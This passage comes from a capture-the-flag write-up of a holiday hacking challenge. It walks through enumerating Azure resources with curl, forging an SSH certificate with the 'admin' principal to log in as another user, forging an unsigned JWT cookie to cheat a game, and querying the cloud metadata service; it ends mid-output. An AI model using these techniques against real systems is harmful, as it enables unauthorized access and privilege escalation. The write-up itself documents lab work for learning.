+</span></span></code></pre></div><p>Then pass the config file with <code>--config cfg</code>.</p><hr><p><strong>Use the Function App to get his TODO list.</strong></p><p>This is to get the source code. We need to figure out the placeholders.</p><p>GET <a href="https://management.azure.com/subscriptions/%7bsubscriptionId%7d/resourceGroups/%7bresourceGroupName%7d/providers/Microsoft.Web/sites/%7bname%7d/sourcecontrols/web?api-version=2022-03-01" target=_blank rel="noreferrer noopener">https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01</a></p><p><a href="https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl" target=_blank rel="noreferrer noopener">https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl</a></p><p>Now we need three placeholders:</p><ul><li><code>name</code> is probably <code>northpole-ssh-certs-fa</code></li><li><code>subscriptionId</code>: TBD.</li><li><code>resourceGroupName</code>: TBD.</li></ul><p>GET <a href="https://management.azure.com/subscriptions/%7bsubscriptionId%7d/resourceGroups/%7bresourceGroupName%7d/providers/Microsoft.Web/sites/%7bname%7d/sourcecontrols/web?api-version=2022-03-01" target=_blank rel="noreferrer noopener">https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01</a></p><h2 id=list-all-subscriptions>List all subscriptions
+<a class=header-link href=#list-all-subscriptions><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><code>GET https://management.azure.com/subscriptions?api-version=2022-12-01</code></p><p><a href="https://learn.microsoft.com/en-us/rest/api/resources/subscriptions/list?view=rest-resources-2022-12-01&amp;tabs=HTTP" target=_blank rel="noreferrer noopener">https://learn.microsoft.com/en-us/rest/api/resources/subscriptions/list?view=rest-resources-2022-12-01&tabs=HTTP</a></p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>curl <span style=color:#2aa198>&#34;https://management.azure.com/subscriptions?api-version=2022-12-01&#34;</span> --config cfg
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// 2b0942f3-9bca-484b-a508-abdae2db5e64
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;value&#34;</span>: [
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;authorizationSource&#34;</span>: <span style=color:#2aa198>&#34;RoleBased&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;managedByTenants&#34;</span>: [],
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;tags&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;sans:application_owner&#34;</span>: <span style=color:#2aa198>&#34;SANS:R&amp;D&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;finance:business_unit&#34;</span>: <span style=color:#2aa198>&#34;curriculum&#34;</span>
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;subscriptionId&#34;</span>: <span style=color:#2aa198>&#34;2b0942f3-9bca-484b-a508-abdae2db5e64&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;tenantId&#34;</span>: <span style=color:#2aa198>&#34;90a38eda-4006-4dd5-924c-6ca55cacc14d&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;displayName&#34;</span>: <span style=color:#2aa198>&#34;sans-hhc&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;state&#34;</span>: <span style=color:#2aa198>&#34;Enabled&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;subscriptionPolicies&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;locationPlacementId&#34;</span>: <span style=color:#2aa198>&#34;Public_2014-09-01&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;quotaId&#34;</span>: <span style=color:#2aa198>&#34;EnterpriseAgreement_2014-09-01&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;spendingLimit&#34;</span>: <span style=color:#2aa198>&#34;Off&#34;</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  ],
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;count&#34;</span>: {
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;type&#34;</span>: <span style=color:#2aa198>&#34;Total&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;value&#34;</span>: <span style=color:#2aa198>1</span>
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=list-all-resource-groups>List all Resource Groups
+<a class=header-link href=#list-all-resource-groups><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>GET <a href="https://management.azure.com/subscriptions/%7bsubscriptionId%7d/resourcegroups?api-version=2021-04-01" target=_blank rel="noreferrer noopener">https://management.azure.com/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01</a></p><p><a href="https://learn.microsoft.com/en-us/rest/api/resources/resource-groups/list?view=rest-resources-2021-04-01" target=_blank rel="noreferrer noopener">https://learn.microsoft.com/en-us/rest/api/resources/resource-groups/list?view=rest-resources-2021-04-01</a></p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>curl <span style=color:#2aa198>&#34;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups?api-version=2021-04-01&#34;</span> --config cfg
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// northpole-rg1
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;value&#34;</span>: [
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;northpole-rg1&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;type&#34;</span>: <span style=color:#2aa198>&#34;Microsoft.Resources/resourceGroups&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;location&#34;</span>: <span style=color:#2aa198>&#34;eastus&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;tags&#34;</span>: {},
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;properties&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;provisioningState&#34;</span>: <span style=color:#2aa198>&#34;Succeeded&#34;</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  ]
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=red-herring---github-repo>Red Herring - GitHub Repo
+<a class=header-link href=#red-herring---github-repo><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>I went through a red herring and got the source code for the SSH app
+(<code>northpole-ssh-certs-fa</code>)</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>curl <span style=color:#2aa198>&#34;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01&#34;</span>
+</span></span><span style=display:flex><span>    --config cfg
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#586e75>// removed
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>  <span style=color:#268bd2>&#34;properties&#34;</span>: {
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;repoUrl&#34;</span>: <span style=color:#2aa198>&#34;https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#586e75>// removed
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Let's go here which is available publicly:
+<a href=https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa target=_blank rel="noreferrer noopener">https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa</a></p><p>There is no TODO list here. We need to list all the function apps here and find
+the TODO app's name to get its source code.</p><h2 id=red-herring-2---login-as-alabaster>Red Herring 2 - Login as Alabaster
+<a class=header-link href=#red-herring-2---login-as-alabaster><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>I saw that <code>alabaster</code> is the 2nd user on the machine. I tried to create a cert
+for <code>alabaster</code> and login and it didn't work. We can only login as <code>monitor</code>.</p><p>Then I looked at the source code of the application and saw we can have a 2nd
+JSON key named <code>principal</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#719e07>def</span> <span style=color:#268bd2>parse_input</span>(data) <span style=color:#719e07>-&gt;</span> Tuple[PublicKey, <span style=color:#b58900>str</span>]:
+</span></span><span style=display:flex><span>    <span style=color:#2aa198>&#34;&#34;&#34;Parse and validate input parameters.&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#586e75># removed</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    principal <span style=color:#719e07>=</span> data<span style=color:#719e07>.</span>get(<span style=color:#2aa198>&#34;principal&#34;</span>, DEFAULT_PRINCIPAL)
+</span></span><span style=display:flex><span>    <span style=color:#586e75># removed</span>
+</span></span><span style=display:flex><span>    principal <span style=color:#719e07>=</span> principal<span style=color:#719e07>.</span>strip()
+</span></span><span style=display:flex><span>    <span style=color:#586e75># removed</span>
+</span></span><span style=display:flex><span>    <span style=color:#719e07>try</span>:
+</span></span><span style=display:flex><span>        <span style=color:#719e07>return</span> PublicKey<span style=color:#719e07>.</span>from_string(ssh_pub_key), principal
+</span></span><span style=display:flex><span>    <span style=color:#719e07>except</span> <span style=color:#cb4b16>ValueError</span> <span style=color:#719e07>as</span> err:
+</span></span><span style=display:flex><span>        <span style=color:#719e07>raise</span> ValidationError(<span style=color:#2aa198>&#34;ssh_pub_key is not a valid SSH public key.&#34;</span>) <span style=color:#719e07>from</span> err
+</span></span></code></pre></div><p>It's used in <code>create_cert</code> which is done with a POST request.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#268bd2>@app.route</span>(route<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;create-cert&#34;</span>, methods<span style=color:#719e07>=</span>[<span style=color:#2aa198>&#39;GET&#39;</span>, <span style=color:#2aa198>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#719e07>def</span> <span style=color:#268bd2>create_cert</span>(req: func<span style=color:#719e07>.</span>HttpRequest) <span style=color:#719e07>-&gt;</span> func<span style=color:#719e07>.</span>HttpResponse:
+</span></span><span style=display:flex><span>    <span style=color:#2aa198>&#34;&#34;&#34;Create SSH certificate.&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#586e75># removed</span>
+</span></span><span style=display:flex><span>    ssh_pub_key, principal <span style=color:#719e07>=</span> parse_input(req<span style=color:#719e07>.</span>get_json())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    cert_fields <span style=color:#719e07>=</span> CertificateFields(
+</span></span><span style=display:flex><span>        serial<span style=color:#719e07>=</span><span style=color:#2aa198>1</span>,
+</span></span><span style=display:flex><span>        key_id<span style=color:#719e07>=</span><span style=color:#b58900>str</span>(uuid<span style=color:#719e07>.</span>uuid4()),
+</span></span><span style=display:flex><span>        valid_after<span style=color:#719e07>=</span>datetime<span style=color:#719e07>.</span>utcnow() <span style=color:#719e07>-</span> timedelta(minutes<span style=color:#719e07>=</span><span style=color:#2aa198>5</span>),
+</span></span><span style=display:flex><span>        valid_before<span style=color:#719e07>=</span>datetime<span style=color:#719e07>.</span>utcnow() <span style=color:#719e07>+</span> timedelta(days<span style=color:#719e07>=</span><span style=color:#2aa198>28</span>),
+</span></span><span style=display:flex><span>        principals<span style=color:#719e07>=</span>[principal],
+</span></span><span style=display:flex><span>        critical_options<span style=color:#719e07>=</span>[],
+</span></span><span style=display:flex><span>        extensions<span style=color:#719e07>=</span>[
+</span></span><span style=display:flex><span>            <span style=color:#2aa198>&#34;permit-pty&#34;</span>
+</span></span><span style=display:flex><span>        ]
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#586e75># removed</span>
+</span></span><span style=display:flex><span>    ssh_cert <span style=color:#719e07>=</span> SSHCertificate<span style=color:#719e07>.</span>create(
+</span></span><span style=display:flex><span>        subject_pubkey<span style=color:#719e07>=</span>ssh_pub_key,
+</span></span><span style=display:flex><span>        ca_privkey<span style=color:#719e07>=</span>ca_ssh_priv_key,
+</span></span><span style=display:flex><span>        fields<span style=color:#719e07>=</span>cert_fields,
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ssh_cert<span style=color:#719e07>.</span>sign()
+</span></span><span style=display:flex><span>    logging<span style=color:#719e07>.</span>info(<span style=color:#2aa198>&#34;SSH signed certificate: </span><span style=color:#2aa198>%s</span><span style=color:#2aa198>&#34;</span>, ssh_cert<span style=color:#719e07>.</span>to_string())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#719e07>return</span> func<span style=color:#719e07>.</span>HttpResponse(
+</span></span><span style=display:flex><span>        json<span style=color:#719e07>.</span>dumps({<span style=color:#2aa198>&#34;ssh_cert&#34;</span>: ssh_cert<span style=color:#719e07>.</span>to_string(), <span style=color:#2aa198>&#34;principal&#34;</span>: principal}),
+</span></span><span style=display:flex><span>        mimetype<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;application/json&#34;</span>,
+</span></span><span style=display:flex><span>        status_code<span style=color:#719e07>=</span><span style=color:#2aa198>200</span>
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    <span style=color:#586e75>#  removed</span>
+</span></span></code></pre></div><p>So I created a new key pair for <code>alabaster</code>. Opened the DevTools and signed it
+normally. Then right-click and copy as cURL command and then modified the
+payload.</p><p>So the new payload was:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;ssh_pub_key&#34;</span>: <span style=color:#2aa198>&#34;ssh-rsa [removed] alabaster&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;principal&#34;</span>: <span style=color:#2aa198>&#34;alabaster&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>And it didn't work. Mainly because I had not realized <code>principal</code> and <code>username</code>
+are different. So I had to login as monitor and look at the sshd configuration
+to figure out what principal is used server-side.</p><p>It's in <code>/etc/ssh/auth_principals</code> and we have two files there:</p><pre tabindex=0><code>$ ls /etc/ssh/auth_principals/
+alabaster  monitor`
+$ cat monitor
+elf
+$ cat alabaster
+admin
+</code></pre><p>So we need to use the principal <code>admin</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;ssh_pub_key&#34;</span>: <span style=color:#2aa198>&#34;ssh-rsa [removed] alabaster&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;principal&#34;</span>: <span style=color:#2aa198>&#34;admin&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>$ curl &#39;https:<span style=color:#586e75>//northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl&#39; \
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>  -H &#39;authority: northpole-ssh-certs-fa.azurewebsites.net&#39; \
+</span></span><span style=display:flex><span>  -H &#39;accept: */*&#39; \
+</span></span><span style=display:flex><span>  -H &#39;content-type: application/json&#39; \
+</span></span><span style=display:flex><span>  -H &#39;origin: https:<span style=color:#586e75>//northpole-ssh-certs-fa.azurewebsites.net&#39; \
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>  -H &#39;referer: https:<span style=color:#586e75>//northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl&#39; \
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>  --data-raw &#39;{<span style=color:#268bd2>&#34;ssh_pub_key&#34;</span>:<span style=color:#2aa198>&#34;ssh-rsa [token] alabaster&#34;</span>,<span style=color:#268bd2>&#34;principal&#34;</span>:<span style=color:#2aa198>&#34;admin&#34;</span>}&#39; \
+</span></span><span style=display:flex><span>  --compressed
+</span></span></code></pre></div><p>The result had this:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;ssh_cert&#34;</span>: <span style=color:#2aa198>&#34;rsa-sha2-512-cert-v01@openssh.com [removed] &#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;principal&#34;</span>: <span style=color:#2aa198>&#34;admin&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Now, we can login as <code>alabaster</code>.</p><pre tabindex=0><code>ssh alabaster@ssh-server-vm.santaworkshopgeeseislands.org -i alabaster
+
+$ ls
+alabaster_todo.md  impacket
+
+$ cat alabaster_todo.md
+# Geese Islands IT &amp; Security Todo List
+
+[removed the rest of the list]
+
+- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism
+  to speed up data retrieval times. Don&#39;t let Santa eat the cache!
+</code></pre><p>The answer is <code>Gingerbread</code>.</p><p>Hints from alabaster</p><blockquote><p>While we're on the topic of certificates, did you know Active Directory (AD)
+uses them as well? Apparently the service used to manage them can have
+misconfigurations too.</p></blockquote><p>And there's a satellite above the islands.</p><h1 id=elf-hunt>Elf Hunt
+<a class=header-link href=#elf-hunt><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75
+points.</p></blockquote><p>Unlock the mysteries of JWTs with insights from
+<a href=https://portswigger.net/web-security/jwt target=_blank rel="noreferrer noopener">PortSwigger's JWT Guide</a>.</p><p>Elves are too fast to hit, probably something in the cookies/headers/JWT.</p><p>The original request has a cookie named <code>ElfHunt_JWT</code> (I am just gonna put the
+decoded values here).</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#268bd2>&#34;alg&#34;</span>:<span style=color:#2aa198>&#34;none&#34;</span>,<span style=color:#268bd2>&#34;typ&#34;</span>:<span style=color:#2aa198>&#34;JWT&#34;</span>}
+</span></span><span style=display:flex><span>{<span style=color:#268bd2>&#34;speed&#34;</span>: <span style=color:#2aa198>-500</span>}
+</span></span></code></pre></div><p>The override must happen on <code>main.js</code> which is the file that decodes the JWT and
+sets up the game. So we can just <a href=https://developer.chrome.com/docs/devtools/application/cookies target=_blank rel="noreferrer noopener">modify the cookie value</a> in Chrome at
+<code>Applications > Storage > Cookies > https://elfhunt.org</code> to
+<code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6MH0.</code>.</p><p>Changing to <code>{"speed":0}</code> and reloading the page. This makes nothing happen. We
+have to something low like <code>{"speed":-50}</code> (+10 didn't work either, maybe it
+makes them fly the other way?).</p><p>So I changed the speed to <code>-50</code>, reload the page and click the game again.
+Scored 75 points and it showed me a diary page.</p><p>According to Piney, his comms office is somewhere else. It might come in handy
+there.</p><blockquote><p>What have you found there? The Captain's Journal? Yeah, he comes around a lot.
+You can find his comms office over at Brass Buoy Port on Steampunk Island.</p></blockquote><p>Link to captain's journal: <a href=https://elfhunt.org/static/images/captainsJournal.png target=_blank rel="noreferrer noopener">https://elfhunt.org/static/images/captainsJournal.png</a></p><p>The only important thing is the name of the admin role:
+<code>GeeseIslandsSuperChiefCommunicationsOfficer</code>.</p><h1 id=active-directory>Active Directory
+<a class=header-link href=#active-directory><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD
+environment. What's the name of the secret file in the inaccessible folder on
+the FileShare?</p></blockquote><p>Off to Steampunk Island we go.</p><p><strong>Ribb Bonbowford</strong>:</p><blockquote><p>I'm worried because our Active Directory server is hosted there and Wombley
+Cube's research department uses one of its fileshares to store their sensitive
+files.</p></blockquote><p>From hints:</p><blockquote><p>It looks like Alabaster's SSH account has a couple of tools installed which
+might prove useful.</p><p>Certificates are everywhere. Did you know Active Directory (AD) uses
+certificates as well? Apparently the service used to manage them can have
+misconfigurations too.</p></blockquote><p>Login back to the account. We see <code>impacket</code>. But where do we start?</p><p>Let's get info from Azure metadata service.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>curl -s -H Metadata:<span style=color:#cb4b16>true</span> <span style=color:#2aa198>&#34;http://169.254.169.254/metadata/instance?api-version=2021-02-01&#34;</span> | jq
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;compute&#34;</span>: {
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;azEnvironment&#34;</span>: <span style=color:#2aa198>&#34;AzurePublicCloud&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;customData&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;evictionPolicy&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;isHostCompatibilityLayerVm&#34;</span>: <span style=color:#2aa198>&#34;false&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;licenseType&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;location&#34;</span>: <span style=color:#2aa198>&#34;eastus&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;ssh-server-vm&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;offer&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;osProfile&#34;</span>: {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;adminUsername&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;computerName&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;disablePasswordAuthentication&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;osType&#34;</span>: <span style=color:#2aa198>&#34;Linux&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;placementGroupId&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;plan&#34;</span>: {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;product&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;publisher&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;platformFaultDomain&#34;</span>: <span style=color:#2aa198>&#34;0&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;platformUpdateDomain&#34;</span>: <span style=color:#2aa198>&#34;0&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;priority&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;provider&#34;</span>: <span style=color:#2aa198>&#34;Microsoft.Compute&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;publicKeys&#34;</span>: [],
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;publisher&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
